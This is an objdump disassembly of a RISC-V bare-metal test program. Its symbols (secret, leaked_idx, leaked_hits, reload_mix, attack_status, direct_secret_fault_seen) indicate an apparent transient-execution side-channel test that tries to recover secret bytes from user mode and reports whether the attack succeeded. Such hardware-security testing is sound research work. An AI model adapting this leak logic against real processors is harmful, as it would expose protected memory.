    80001596:	aa678793          	addi	a5,a5,-1370 # 8001b038 <bad_trap_count>
    8000159a:	0007b883          	ld	a7,0(a5)
    8000159e:	0001a797          	auipc	a5,0x1a
    800015a2:	aa278793          	addi	a5,a5,-1374 # 8001b040 <last_mcause>
    800015a6:	639c                	ld	a5,0(a5)
    800015a8:	0001a717          	auipc	a4,0x1a
    800015ac:	aa070713          	addi	a4,a4,-1376 # 8001b048 <last_mepc>
    800015b0:	6318                	ld	a4,0(a4)
    800015b2:	8e3a                	mv	t3,a4
    800015b4:	0001a717          	auipc	a4,0x1a
    800015b8:	aa070713          	addi	a4,a4,-1376 # 8001b054 <attack_status>
    800015bc:	4318                	lw	a4,0(a4)
    800015be:	2701                	sext.w	a4,a4
    800015c0:	e83a                	sd	a4,16(sp)
    800015c2:	e472                	sd	t3,8(sp)
    800015c4:	e03e                	sd	a5,0(sp)
    800015c6:	879a                	mv	a5,t1
    800015c8:	872a                	mv	a4,a0
    800015ca:	00005517          	auipc	a0,0x5
    800015ce:	3e650513          	addi	a0,a0,998 # 800069b0 <printf_+0xcaa>
    800015d2:	734040ef          	jal	80005d06 <printf_>
    800015d6:	4785                	li	a5,1
    800015d8:	fef42223          	sw	a5,-28(s0)
    800015dc:	fc043c23          	sd	zero,-40(s0)
    800015e0:	ae6d                	j	8000199a <main+0x5cc>
    800015e2:	0000f717          	auipc	a4,0xf
    800015e6:	a1e70713          	addi	a4,a4,-1506 # 80010000 <leaked_idx>
    800015ea:	fd843783          	ld	a5,-40(s0)
    800015ee:	0786                	slli	a5,a5,0x1
    800015f0:	97ba                	add	a5,a5,a4
    800015f2:	0007c783          	lbu	a5,0(a5)
    800015f6:	fcf403a3          	sb	a5,-57(s0)
    800015fa:	0000f717          	auipc	a4,0xf
    800015fe:	a0670713          	addi	a4,a4,-1530 # 80010000 <leaked_idx>
    80001602:	fd843783          	ld	a5,-40(s0)
    80001606:	0786                	slli	a5,a5,0x1
    80001608:	97ba                	add	a5,a5,a4
    8000160a:	0017c783          	lbu	a5,1(a5)
    8000160e:	fcf40323          	sb	a5,-58(s0)
    80001612:	fd843783          	ld	a5,-40(s0)
    80001616:	0795                	addi	a5,a5,5
    80001618:	00006717          	auipc	a4,0x6
    8000161c:	9e870713          	addi	a4,a4,-1560 # 80007000 <secret>
    80001620:	97ba                	add	a5,a5,a4
    80001622:	0007c783          	lbu	a5,0(a5)
    80001626:	fcf402a3          	sb	a5,-59(s0)
    8000162a:	fc544783          	lbu	a5,-59(s0)
    8000162e:	0007851b          	sext.w	a0,a5
    80001632:	fc544783          	lbu	a5,-59(s0)
    80001636:	0007831b          	sext.w	t1,a5
    8000163a:	fc544783          	lbu	a5,-59(s0)
    8000163e:	2781                	sext.w	a5,a5
    80001640:	00013717          	auipc	a4,0x13
    80001644:	9c070713          	addi	a4,a4,-1600 # 80014000 <leaked_hits>
    80001648:	fd843683          	ld	a3,-40(s0)
    8000164c:	06a2                	slli	a3,a3,0x8
    8000164e:	97b6                	add	a5,a5,a3
    80001650:	078e                	slli	a5,a5,0x3
    80001652:	97ba                	add	a5,a5,a4
    80001654:	0007be03          	ld	t3,0(a5)
    80001658:	fc744783          	lbu	a5,-57(s0)
    8000165c:	0ff7f713          	zext.b	a4,a5
    80001660:	47fd                	li	a5,31
    80001662:	00e7ff63          	bgeu	a5,a4,80001680 <main+0x2b2>
    80001666:	fc744783          	lbu	a5,-57(s0)
    8000166a:	0ff7f713          	zext.b	a4,a5
    8000166e:	07e00793          	li	a5,126
    80001672:	00e7e763          	bltu	a5,a4,80001680 <main+0x2b2>
    80001676:	fc744783          	lbu	a5,-57(s0)
    8000167a:	0007869b          	sext.w	a3,a5
    8000167e:	a019                	j	80001684 <main+0x2b6>
    80001680:	03f00693          	li	a3,63
    80001684:	fc744783          	lbu	a5,-57(s0)
    80001688:	0007881b          	sext.w	a6,a5
    8000168c:	00010717          	auipc	a4,0x10
    80001690:	97470713          	addi	a4,a4,-1676 # 80011000 <leaked_score>
    80001694:	fd843783          	ld	a5,-40(s0)
    80001698:	0792                	slli	a5,a5,0x4
    8000169a:	97ba                	add	a5,a5,a4
    8000169c:	0007b883          	ld	a7,0(a5)
    800016a0:	fc644783          	lbu	a5,-58(s0)
    800016a4:	0ff7f713          	zext.b	a4,a5
    800016a8:	47fd                	li	a5,31
    800016aa:	00e7ff63          	bgeu	a5,a4,800016c8 <main+0x2fa>
    800016ae:	fc644783          	lbu	a5,-58(s0)
    800016b2:	0ff7f713          	zext.b	a4,a5
    800016b6:	07e00793          	li	a5,126
    800016ba:	00e7e763          	bltu	a5,a4,800016c8 <main+0x2fa>
    800016be:	fc644783          	lbu	a5,-58(s0)
    800016c2:	0007871b          	sext.w	a4,a5
    800016c6:	a019                	j	800016cc <main+0x2fe>
    800016c8:	03f00713          	li	a4,63
    800016cc:	fc644783          	lbu	a5,-58(s0)
    800016d0:	0007861b          	sext.w	a2,a5
    800016d4:	00010597          	auipc	a1,0x10
    800016d8:	92c58593          	addi	a1,a1,-1748 # 80011000 <leaked_score>
    800016dc:	fd843783          	ld	a5,-40(s0)
    800016e0:	0792                	slli	a5,a5,0x4
    800016e2:	97ae                	add	a5,a5,a1
    800016e4:	679c                	ld	a5,8(a5)
    800016e6:	e83e                	sd	a5,16(sp)
    800016e8:	e432                	sd	a2,8(sp)
    800016ea:	e03a                	sd	a4,0(sp)
    800016ec:	87b6                	mv	a5,a3
    800016ee:	8772                	mv	a4,t3
    800016f0:	869a                	mv	a3,t1
    800016f2:	862a                	mv	a2,a0
    800016f4:	fd843583          	ld	a1,-40(s0)
    800016f8:	00005517          	auipc	a0,0x5
    800016fc:	36050513          	addi	a0,a0,864 # 80006a58 <printf_+0xd52>
    80001700:	606040ef          	jal	80005d06 <printf_>
    80001704:	00014717          	auipc	a4,0x14
    80001708:	8fc70713          	addi	a4,a4,-1796 # 80015000 <tries_used>
    8000170c:	fd843783          	ld	a5,-40(s0)
    80001710:	078e                	slli	a5,a5,0x3
    80001712:	97ba                	add	a5,a5,a4
    80001714:	6390                	ld	a2,0(a5)
    80001716:	4785                	li	a5,1
    80001718:	4709                	li	a4,2
    8000171a:	4685                	li	a3,1
    8000171c:	fd843583          	ld	a1,-40(s0)
    80001720:	00005517          	auipc	a0,0x5
    80001724:	3b050513          	addi	a0,a0,944 # 80006ad0 <printf_+0xdca>
    80001728:	5de040ef          	jal	80005d06 <printf_>
    8000172c:	00011717          	auipc	a4,0x11
    80001730:	8d470713          	addi	a4,a4,-1836 # 80012000 <leaked_top_idx>
    80001734:	fd843783          	ld	a5,-40(s0)
    80001738:	078a                	slli	a5,a5,0x2
    8000173a:	97ba                	add	a5,a5,a4
    8000173c:	0007c783          	lbu	a5,0(a5)
    80001740:	873e                	mv	a4,a5
    80001742:	47fd                	li	a5,31
    80001744:	02e7fe63          	bgeu	a5,a4,80001780 <main+0x3b2>
    80001748:	00011717          	auipc	a4,0x11
    8000174c:	8b870713          	addi	a4,a4,-1864 # 80012000 <leaked_top_idx>
    80001750:	fd843783          	ld	a5,-40(s0)
    80001754:	078a                	slli	a5,a5,0x2
    80001756:	97ba                	add	a5,a5,a4
    80001758:	0007c783          	lbu	a5,0(a5)
    8000175c:	873e                	mv	a4,a5
    8000175e:	07e00793          	li	a5,126
    80001762:	00e7ef63          	bltu	a5,a4,80001780 <main+0x3b2>
    80001766:	00011717          	auipc	a4,0x11
    8000176a:	89a70713          	addi	a4,a4,-1894 # 80012000 <leaked_top_idx>
    8000176e:	fd843783          	ld	a5,-40(s0)
    80001772:	078a                	slli	a5,a5,0x2
    80001774:	97ba                	add	a5,a5,a4
    80001776:	0007c783          	lbu	a5,0(a5)
    8000177a:	0007861b          	sext.w	a2,a5
    8000177e:	a019                	j	80001784 <main+0x3b6>
    80001780:	03f00613          	li	a2,63
    80001784:	00011717          	auipc	a4,0x11
    80001788:	87c70713          	addi	a4,a4,-1924 # 80012000 <leaked_top_idx>
    8000178c:	fd843783          	ld	a5,-40(s0)
    80001790:	078a                	slli	a5,a5,0x2
    80001792:	97ba                	add	a5,a5,a4
    80001794:	0007c783          	lbu	a5,0(a5)
    80001798:	00078e1b          	sext.w	t3,a5
    8000179c:	00012717          	auipc	a4,0x12
    800017a0:	86470713          	addi	a4,a4,-1948 # 80013000 <leaked_top_score>
    800017a4:	fd843783          	ld	a5,-40(s0)
    800017a8:	0796                	slli	a5,a5,0x5
    800017aa:	97ba                	add	a5,a5,a4
    800017ac:	0007be83          	ld	t4,0(a5)
    800017b0:	00011717          	auipc	a4,0x11
    800017b4:	85070713          	addi	a4,a4,-1968 # 80012000 <leaked_top_idx>
    800017b8:	fd843783          	ld	a5,-40(s0)
    800017bc:	078a                	slli	a5,a5,0x2
    800017be:	97ba                	add	a5,a5,a4
    800017c0:	0017c783          	lbu	a5,1(a5)
    800017c4:	873e                	mv	a4,a5
    800017c6:	47fd                	li	a5,31
    800017c8:	02e7fe63          	bgeu	a5,a4,80001804 <main+0x436>
    800017cc:	00011717          	auipc	a4,0x11
    800017d0:	83470713          	addi	a4,a4,-1996 # 80012000 <leaked_top_idx>
    800017d4:	fd843783          	ld	a5,-40(s0)
    800017d8:	078a                	slli	a5,a5,0x2
    800017da:	97ba                	add	a5,a5,a4
    800017dc:	0017c783          	lbu	a5,1(a5)
    800017e0:	873e                	mv	a4,a5
    800017e2:	07e00793          	li	a5,126
    800017e6:	00e7ef63          	bltu	a5,a4,80001804 <main+0x436>
    800017ea:	00011717          	auipc	a4,0x11
    800017ee:	81670713          	addi	a4,a4,-2026 # 80012000 <leaked_top_idx>
    800017f2:	fd843783          	ld	a5,-40(s0)
    800017f6:	078a                	slli	a5,a5,0x2
    800017f8:	97ba                	add	a5,a5,a4
    800017fa:	0017c783          	lbu	a5,1(a5)
    800017fe:	0007859b          	sext.w	a1,a5
    80001802:	a019                	j	80001808 <main+0x43a>
    80001804:	03f00593          	li	a1,63
    80001808:	00010717          	auipc	a4,0x10
    8000180c:	7f870713          	addi	a4,a4,2040 # 80012000 <leaked_top_idx>
    80001810:	fd843783          	ld	a5,-40(s0)
    80001814:	078a                	slli	a5,a5,0x2
    80001816:	97ba                	add	a5,a5,a4
    80001818:	0017c783          	lbu	a5,1(a5)
    8000181c:	00078f1b          	sext.w	t5,a5
    80001820:	00011717          	auipc	a4,0x11
    80001824:	7e070713          	addi	a4,a4,2016 # 80013000 <leaked_top_score>
    80001828:	fd843783          	ld	a5,-40(s0)
    8000182c:	0796                	slli	a5,a5,0x5
    8000182e:	97ba                	add	a5,a5,a4
    80001830:	0087bf83          	ld	t6,8(a5)
    80001834:	00010717          	auipc	a4,0x10
    80001838:	7cc70713          	addi	a4,a4,1996 # 80012000 <leaked_top_idx>
    8000183c:	fd843783          	ld	a5,-40(s0)
    80001840:	078a                	slli	a5,a5,0x2
    80001842:	97ba                	add	a5,a5,a4
    80001844:	0027c783          	lbu	a5,2(a5)
    80001848:	873e                	mv	a4,a5
    8000184a:	47fd                	li	a5,31
    8000184c:	02e7fe63          	bgeu	a5,a4,80001888 <main+0x4ba>
    80001850:	00010717          	auipc	a4,0x10
    80001854:	7b070713          	addi	a4,a4,1968 # 80012000 <leaked_top_idx>
    80001858:	fd843783          	ld	a5,-40(s0)
    8000185c:	078a                	slli	a5,a5,0x2
    8000185e:	97ba                	add	a5,a5,a4
    80001860:	0027c783          	lbu	a5,2(a5)
    80001864:	873e                	mv	a4,a5
    80001866:	07e00793          	li	a5,126
    8000186a:	00e7ef63          	bltu	a5,a4,80001888 <main+0x4ba>
    8000186e:	00010717          	auipc	a4,0x10
    80001872:	79270713          	addi	a4,a4,1938 # 80012000 <leaked_top_idx>
    80001876:	fd843783          	ld	a5,-40(s0)
    8000187a:	078a                	slli	a5,a5,0x2
    8000187c:	97ba                	add	a5,a5,a4
    8000187e:	0027c783          	lbu	a5,2(a5)
    80001882:	0007871b          	sext.w	a4,a5
    80001886:	a019                	j	8000188c <main+0x4be>
    80001888:	03f00713          	li	a4,63
    8000188c:	00010697          	auipc	a3,0x10
    80001890:	77468693          	addi	a3,a3,1908 # 80012000 <leaked_top_idx>
    80001894:	fd843783          	ld	a5,-40(s0)
    80001898:	078a                	slli	a5,a5,0x2
    8000189a:	97b6                	add	a5,a5,a3
    8000189c:	0027c783          	lbu	a5,2(a5)
    800018a0:	0007851b          	sext.w	a0,a5
    800018a4:	00011697          	auipc	a3,0x11
    800018a8:	75c68693          	addi	a3,a3,1884 # 80013000 <leaked_top_score>
    800018ac:	fd843783          	ld	a5,-40(s0)
    800018b0:	0796                	slli	a5,a5,0x5
    800018b2:	97b6                	add	a5,a5,a3
    800018b4:	0107b803          	ld	a6,16(a5)
    800018b8:	00010697          	auipc	a3,0x10
    800018bc:	74868693          	addi	a3,a3,1864 # 80012000 <leaked_top_idx>
    800018c0:	fd843783          	ld	a5,-40(s0)
    800018c4:	078a                	slli	a5,a5,0x2
    800018c6:	97b6                	add	a5,a5,a3
    800018c8:	0037c783          	lbu	a5,3(a5)
    800018cc:	86be                	mv	a3,a5
    800018ce:	47fd                	li	a5,31
    800018d0:	02d7fe63          	bgeu	a5,a3,8000190c <main+0x53e>
    800018d4:	00010697          	auipc	a3,0x10
    800018d8:	72c68693          	addi	a3,a3,1836 # 80012000 <leaked_top_idx>
    800018dc:	fd843783          	ld	a5,-40(s0)
    800018e0:	078a                	slli	a5,a5,0x2
    800018e2:	97b6                	add	a5,a5,a3
    800018e4:	0037c783          	lbu	a5,3(a5)
    800018e8:	86be                	mv	a3,a5
    800018ea:	07e00793          	li	a5,126
    800018ee:	00d7ef63          	bltu	a5,a3,8000190c <main+0x53e>
    800018f2:	00010697          	auipc	a3,0x10
    800018f6:	70e68693          	addi	a3,a3,1806 # 80012000 <leaked_top_idx>
    800018fa:	fd843783          	ld	a5,-40(s0)
    800018fe:	078a                	slli	a5,a5,0x2
    80001900:	97b6                	add	a5,a5,a3
    80001902:	0037c783          	lbu	a5,3(a5)
    80001906:	0007869b          	sext.w	a3,a5
    8000190a:	a019                	j	80001910 <main+0x542>
    8000190c:	03f00693          	li	a3,63
    80001910:	00010897          	auipc	a7,0x10
    80001914:	6f088893          	addi	a7,a7,1776 # 80012000 <leaked_top_idx>
    80001918:	fd843783          	ld	a5,-40(s0)
    8000191c:	078a                	slli	a5,a5,0x2
    8000191e:	97c6                	add	a5,a5,a7
    80001920:	0037c783          	lbu	a5,3(a5)
    80001924:	0007889b          	sext.w	a7,a5
    80001928:	00011317          	auipc	t1,0x11
    8000192c:	6d830313          	addi	t1,t1,1752 # 80013000 <leaked_top_score>
    80001930:	fd843783          	ld	a5,-40(s0)
    80001934:	0796                	slli	a5,a5,0x5
    80001936:	979a                	add	a5,a5,t1
    80001938:	6f9c                	ld	a5,24(a5)
    8000193a:	f43e                	sd	a5,40(sp)
    8000193c:	f046                	sd	a7,32(sp)
    8000193e:	ec36                	sd	a3,24(sp)
    80001940:	e842                	sd	a6,16(sp)
    80001942:	e42a                	sd	a0,8(sp)
    80001944:	e03a                	sd	a4,0(sp)
    80001946:	88fe                	mv	a7,t6
    80001948:	887a                	mv	a6,t5
    8000194a:	87ae                	mv	a5,a1
    8000194c:	8776                	mv	a4,t4
    8000194e:	86f2                	mv	a3,t3
    80001950:	fd843583          	ld	a1,-40(s0)
    80001954:	00005517          	auipc	a0,0x5
    80001958:	1c450513          	addi	a0,a0,452 # 80006b18 <printf_+0xe12>
    8000195c:	3aa040ef          	jal	80005d06 <printf_>
    80001960:	fc744783          	lbu	a5,-57(s0)
    80001964:	873e                	mv	a4,a5
    80001966:	fc544783          	lbu	a5,-59(s0)
    8000196a:	0ff77713          	zext.b	a4,a4
    8000196e:	0ff7f793          	zext.b	a5,a5
    80001972:	00f70f63          	beq	a4,a5,80001990 <main+0x5c2>
    80001976:	fc644783          	lbu	a5,-58(s0)
    8000197a:	873e                	mv	a4,a5
    8000197c:	fc544783          	lbu	a5,-59(s0)
    80001980:	0ff77713          	zext.b	a4,a4
    80001984:	0ff7f793          	zext.b	a5,a5
    80001988:	00f70463          	beq	a4,a5,80001990 <main+0x5c2>
    8000198c:	fe042223          	sw	zero,-28(s0)
    80001990:	fd843783          	ld	a5,-40(s0)
    80001994:	0785                	addi	a5,a5,1
    80001996:	fcf43c23          	sd	a5,-40(s0)
    8000199a:	fd843783          	ld	a5,-40(s0)
    8000199e:	c40782e3          	beqz	a5,800015e2 <main+0x214>
    800019a2:	00016797          	auipc	a5,0x16
    800019a6:	65e78793          	addi	a5,a5,1630 # 80018000 <direct_secret_fault_seen>
    800019aa:	639c                	ld	a5,0(a5)
    800019ac:	cb89                	beqz	a5,800019be <main+0x5f0>
    800019ae:	00017797          	auipc	a5,0x17
    800019b2:	65278793          	addi	a5,a5,1618 # 80019000 <direct_secret_read_completed>
    800019b6:	639c                	ld	a5,0(a5)
    800019b8:	e399                	bnez	a5,800019be <main+0x5f0>
    800019ba:	4785                	li	a5,1
    800019bc:	a011                	j	800019c0 <main+0x5f2>
    800019be:	4781                	li	a5,0
    800019c0:	fcf42623          	sw	a5,-52(s0)
    800019c4:	00019797          	auipc	a5,0x19
    800019c8:	69078793          	addi	a5,a5,1680 # 8001b054 <attack_status>
    800019cc:	439c                	lw	a5,0(a5)
    800019ce:	2781                	sext.w	a5,a5
    800019d0:	e38d                	bnez	a5,800019f2 <main+0x624>
    800019d2:	00019797          	auipc	a5,0x19
    800019d6:	66678793          	addi	a5,a5,1638 # 8001b038 <bad_trap_count>
    800019da:	639c                	ld	a5,0(a5)
    800019dc:	eb99                	bnez	a5,800019f2 <main+0x624>
    800019de:	fcc42783          	lw	a5,-52(s0)
    800019e2:	2781                	sext.w	a5,a5
    800019e4:	c799                	beqz	a5,800019f2 <main+0x624>
    800019e6:	fe442783          	lw	a5,-28(s0)
    800019ea:	2781                	sext.w	a5,a5
    800019ec:	c399                	beqz	a5,800019f2 <main+0x624>
    800019ee:	4785                	li	a5,1
    800019f0:	a011                	j	800019f4 <main+0x626>
    800019f2:	4781                	li	a5,0
    800019f4:	fcf42423          	sw	a5,-56(s0)
    800019f8:	fc842783          	lw	a5,-56(s0)
    800019fc:	2781                	sext.w	a5,a5
    800019fe:	c791                	beqz	a5,80001a0a <main+0x63c>
    80001a00:	00005797          	auipc	a5,0x5
    80001a04:	17878793          	addi	a5,a5,376 # 80006b78 <printf_+0xe72>
    80001a08:	a029                	j	80001a12 <main+0x644>
    80001a0a:	00005797          	auipc	a5,0x5
    80001a0e:	17678793          	addi	a5,a5,374 # 80006b80 <printf_+0xe7a>
    80001a12:	85be                	mv	a1,a5
    80001a14:	00005517          	auipc	a0,0x5
    80001a18:	17450513          	addi	a0,a0,372 # 80006b88 <printf_+0xe82>
    80001a1c:	2ea040ef          	jal	80005d06 <printf_>
    80001a20:	fc842783          	lw	a5,-56(s0)
    80001a24:	2781                	sext.w	a5,a5
    80001a26:	0017b793          	seqz	a5,a5
    80001a2a:	0ff7f793          	zext.b	a5,a5
    80001a2e:	2781                	sext.w	a5,a5
    80001a30:	853e                	mv	a0,a5
    80001a32:	60ea                	ld	ra,152(sp)
    80001a34:	644a                	ld	s0,144(sp)
    80001a36:	610d                	addi	sp,sp,160
    80001a38:	8082                	ret
	...

Disassembly of section .u_text:

0000000080002000 <is_candidate_value>:
    80002000:	1101                	addi	sp,sp,-32
    80002002:	ec22                	sd	s0,24(sp)
    80002004:	1000                	addi	s0,sp,32
    80002006:	fea43423          	sd	a0,-24(s0)
    8000200a:	fe843703          	ld	a4,-24(s0)
    8000200e:	02f00793          	li	a5,47
    80002012:	00e7f863          	bgeu	a5,a4,80002022 <is_candidate_value+0x22>
    80002016:	fe843703          	ld	a4,-24(s0)
    8000201a:	03900793          	li	a5,57
    8000201e:	02e7fa63          	bgeu	a5,a4,80002052 <is_candidate_value+0x52>
    80002022:	fe843703          	ld	a4,-24(s0)
    80002026:	04000793          	li	a5,64
    8000202a:	00e7f863          	bgeu	a5,a4,8000203a <is_candidate_value+0x3a>
    8000202e:	fe843703          	ld	a4,-24(s0)
    80002032:	05a00793          	li	a5,90
    80002036:	00e7fe63          	bgeu	a5,a4,80002052 <is_candidate_value+0x52>
    8000203a:	fe843703          	ld	a4,-24(s0)
    8000203e:	06000793          	li	a5,96
    80002042:	00e7fa63          	bgeu	a5,a4,80002056 <is_candidate_value+0x56>
    80002046:	fe843703          	ld	a4,-24(s0)
    8000204a:	07a00793          	li	a5,122
    8000204e:	00e7e463          	bltu	a5,a4,80002056 <is_candidate_value+0x56>
    80002052:	4785                	li	a5,1
    80002054:	a011                	j	80002058 <is_candidate_value+0x58>
    80002056:	4781                	li	a5,0
    80002058:	853e                	mv	a0,a5
    8000205a:	6462                	ld	s0,24(sp)
    8000205c:	6105                	addi	sp,sp,32
    8000205e:	8082                	ret

0000000080002060 <reload_mix>:
    80002060:	1101                	addi	sp,sp,-32
    80002062:	ec22                	sd	s0,24(sp)
    80002064:	1000                	addi	s0,sp,32
    80002066:	fea43423          	sd	a0,-24(s0)
    8000206a:	feb43023          	sd	a1,-32(s0)
    8000206e:	fe843703          	ld	a4,-24(s0)
    80002072:	87ba                	mv	a5,a4
    80002074:	078a                	slli	a5,a5,0x2
    80002076:	97ba                	add	a5,a5,a4
    80002078:	078a                	slli	a5,a5,0x2
    8000207a:	97ba                	add	a5,a5,a4
    8000207c:	078e                	slli	a5,a5,0x3
    8000207e:	8f99                	sub	a5,a5,a4
    80002080:	07b5                	addi	a5,a5,13
    80002082:	0ff7f793          	zext.b	a5,a5
    80002086:	853e                	mv	a0,a5
    80002088:	6462                	ld	s0,24(sp)
    8000208a:	6105                	addi	sp,sp,32
    8000208c:	8082                	ret
    8000208e:	0001                	nop

0000000080002090 <top_two_idx>:
    80002090:	7139                	addi	sp,sp,-64
    80002092:	fc22                	sd	s0,56(sp)
    80002094:	0080                	addi	s0,sp,64
    80002096:	fca43c23          	sd	a0,-40(s0)
    8000209a:	fcb43823          	sd	a1,-48(s0)
    8000209e:	fcc43423          	sd	a2,-56(s0)
    800020a2:	fcd43023          	sd	a3,-64(s0)
    800020a6:	fc843783          	ld	a5,-56(s0)
    800020aa:	00078023          	sb	zero,0(a5)
    800020ae:	fc843783          	ld	a5,-56(s0)
    800020b2:	0785                	addi	a5,a5,1
    800020b4:	00078023          	sb	zero,0(a5)
    800020b8:	fc043783          	ld	a5,-64(s0)
    800020bc:	0007b023          	sd	zero,0(a5)
    800020c0:	fc043783          	ld	a5,-64(s0)
    800020c4:	07a1                	addi	a5,a5,8
    800020c6:	0007b023          	sd	zero,0(a5)
    800020ca:	fe043423          	sd	zero,-24(s0)
    800020ce:	a075                	j	8000217a <top_two_idx+0xea>
    800020d0:	fe843783          	ld	a5,-24(s0)
    800020d4:	078e                	slli	a5,a5,0x3
    800020d6:	fd843703          	ld	a4,-40(s0)
    800020da:	97ba                	add	a5,a5,a4
    800020dc:	6398                	ld	a4,0(a5)
    800020de:	fc043783          	ld	a5,-64(s0)
    800020e2:	639c                	ld	a5,0(a5)
    800020e4:	04e7f563          	bgeu	a5,a4,8000212e <top_two_idx+0x9e>
    800020e8:	fc043783          	ld	a5,-64(s0)
    800020ec:	07a1                	addi	a5,a5,8
    800020ee:	fc043703          	ld	a4,-64(s0)
    800020f2:	6318                	ld	a4,0(a4)
    800020f4:	e398                	sd	a4,0(a5)
    800020f6:	fc843783          	ld	a5,-56(s0)
    800020fa:	0785                	addi	a5,a5,1
    800020fc:	fc843703          	ld	a4,-56(s0)
    80002100:	00074703          	lbu	a4,0(a4)
    80002104:	00e78023          	sb	a4,0(a5)
    80002108:	fe843783          	ld	a5,-24(s0)
    8000210c:	078e                	slli	a5,a5,0x3
    8000210e:	fd843703          	ld	a4,-40(s0)
    80002112:	97ba                	add	a5,a5,a4
    80002114:	6398                	ld	a4,0(a5)
    80002116:	fc043783          	ld	a5,-64(s0)
    8000211a:	e398                	sd	a4,0(a5)
    8000211c:	fe843783          	ld	a5,-24(s0)
    80002120:	0ff7f713          	zext.b	a4,a5
    80002124:	fc843783          	ld	a5,-56(s0)
    80002128:	00e78023          	sb	a4,0(a5)
    8000212c:	a091                	j	80002170 <top_two_idx+0xe0>
    8000212e:	fe843783          	ld	a5,-24(s0)
    80002132:	078e                	slli	a5,a5,0x3
    80002134:	fd843703          	ld	a4,-40(s0)
    80002138:	97ba                	add	a5,a5,a4
    8000213a:	6398                	ld	a4,0(a5)
    8000213c:	fc043783          	ld	a5,-64(s0)
    80002140:	07a1                	addi	a5,a5,8
    80002142:	639c                	ld	a5,0(a5)
    80002144:	02e7f663          	bgeu	a5,a4,80002170 <top_two_idx+0xe0>
    80002148:	fe843783          	ld	a5,-24(s0)
    8000214c:	078e                	slli	a5,a5,0x3
    8000214e:	fd843703          	ld	a4,-40(s0)
    80002152:	973e                	add	a4,a4,a5
    80002154:	fc043783          	ld	a5,-64(s0)
    80002158:	07a1                	addi	a5,a5,8
    8000215a:	6318                	ld	a4,0(a4)
    8000215c:	e398                	sd	a4,0(a5)
    8000215e:	fc843783          	ld	a5,-56(s0)
    80002162:	0785                	addi	a5,a5,1
    80002164:	fe843703          	ld	a4,-24(s0)
    80002168:	0ff77713          	zext.b	a4,a4
    8000216c:	00e78023          	sb	a4,0(a5)
    80002170:	fe843783          	ld	a5,-24(s0)
    80002174:	0785                	addi	a5,a5,1
    80002176:	fef43423          	sd	a5,-24(s0)
    8000217a:	fe843703          	ld	a4,-24(s0)
    8000217e:	fd043783          	ld	a5,-48(s0)
    80002182:	f4f767e3          	bltu	a4,a5,800020d0 <top_two_idx+0x40>
    80002186:	0001                	nop
    80002188:	0001                	nop
    8000218a:	7462                	ld	s0,56(sp)
    8000218c:	6121                	addi	sp,sp,64
    8000218e:	8082                	ret

0000000080002190 <top_four_idx>:
    80002190:	711d                	addi	sp,sp,-96
    80002192:	eca2                	sd	s0,88(sp)
    80002194:	1080                	addi	s0,sp,96
    80002196:	faa43c23          	sd	a0,-72(s0)
    8000219a:	fab43823          	sd	a1,-80(s0)
    8000219e:	fac43423          	sd	a2,-88(s0)
    800021a2:	fad43023          	sd	a3,-96(s0)
    800021a6:	fe043423          	sd	zero,-24(s0)
    800021aa:	a02d                	j	800021d4 <top_four_idx+0x44>
    800021ac:	fa843703          	ld	a4,-88(s0)
    800021b0:	fe843783          	ld	a5,-24(s0)
    800021b4:	97ba                	add	a5,a5,a4
    800021b6:	00078023          	sb	zero,0(a5)
    800021ba:	fe843783          	ld	a5,-24(s0)
    800021be:	078e                	slli	a5,a5,0x3
    800021c0:	fa043703          	ld	a4,-96(s0)
    800021c4:	97ba                	add	a5,a5,a4
    800021c6:	0007b023          	sd	zero,0(a5)
    800021ca:	fe843783          	ld	a5,-24(s0)
    800021ce:	0785                	addi	a5,a5,1
    800021d0:	fef43423          	sd	a5,-24(s0)
    800021d4:	fe843703          	ld	a4,-24(s0)
    800021d8:	478d                	li	a5,3
    800021da:	fce7f9e3          	bgeu	a5,a4,800021ac <top_four_idx+0x1c>
    800021de:	fe043023          	sd	zero,-32(s0)
    800021e2:	a8c9                	j	800022b4 <top_four_idx+0x124>
    800021e4:	fe043783          	ld	a5,-32(s0)
    800021e8:	078e                	slli	a5,a5,0x3
    800021ea:	fb843703          	ld	a4,-72(s0)
    800021ee:	97ba                	add	a5,a5,a4
    800021f0:	639c                	ld	a5,0(a5)
    800021f2:	fcf43423          	sd	a5,-56(s0)
    800021f6:	fc043c23          	sd	zero,-40(s0)
    800021fa:	a05d                	j	800022a0 <top_four_idx+0x110>
    800021fc:	fd843783          	ld	a5,-40(s0)
    80002200:	078e                	slli	a5,a5,0x3
    80002202:	fa043703          	ld	a4,-96(s0)
    80002206:	97ba                	add	a5,a5,a4
    80002208:	639c                	ld	a5,0(a5)
    8000220a:	fc843703          	ld	a4,-56(s0)
    8000220e:	08e7f463          	bgeu	a5,a4,80002296 <top_four_idx+0x106>
    80002212:	478d                	li	a5,3
    80002214:	fcf43823          	sd	a5,-48(s0)
    80002218:	a0a1                	j	80002260 <top_four_idx+0xd0>
    8000221a:	fd043783          	ld	a5,-48(s0)
    8000221e:	078e                	slli	a5,a5,0x3
    80002220:	17e1                	addi	a5,a5,-8
    80002222:	fa043703          	ld	a4,-96(s0)
    80002226:	973e                	add	a4,a4,a5
    80002228:	fd043783          	ld	a5,-48(s0)
    8000222c:	078e                	slli	a5,a5,0x3
    8000222e:	fa043683          	ld	a3,-96(s0)
    80002232:	97b6                	add	a5,a5,a3
    80002234:	6318                	ld	a4,0(a4)
    80002236:	e398                	sd	a4,0(a5)
    80002238:	fd043783          	ld	a5,-48(s0)
    8000223c:	17fd                	addi	a5,a5,-1
    8000223e:	fa843703          	ld	a4,-88(s0)
    80002242:	973e                	add	a4,a4,a5
    80002244:	fa843683          	ld	a3,-88(s0)
    80002248:	fd043783          	ld	a5,-48(s0)
    8000224c:	97b6                	add	a5,a5,a3
    8000224e:	00074703          	lbu	a4,0(a4)
    80002252:	00e78023          	sb	a4,0(a5)
    80002256:	fd043783          	ld	a5,-48(s0)
    8000225a:	17fd                	addi	a5,a5,-1
    8000225c:	fcf43823          	sd	a5,-48(s0)
    80002260:	fd043703          	ld	a4,-48(s0)
    80002264:	fd843783          	ld	a5,-40(s0)
    80002268:	fae7e9e3          	bltu	a5,a4,8000221a <top_four_idx+0x8a>
    8000226c:	fd843783          	ld	a5,-40(s0)
    80002270:	078e                	slli	a5,a5,0x3
    80002272:	fa043703          	ld	a4,-96(s0)
    80002276:	97ba                	add	a5,a5,a4
    80002278:	fc843703          	ld	a4,-56(s0)
    8000227c:	e398                	sd	a4,0(a5)
    8000227e:	fa843703          	ld	a4,-88(s0)
    80002282:	fd843783          	ld	a5,-40(s0)
    80002286:	97ba                	add	a5,a5,a4
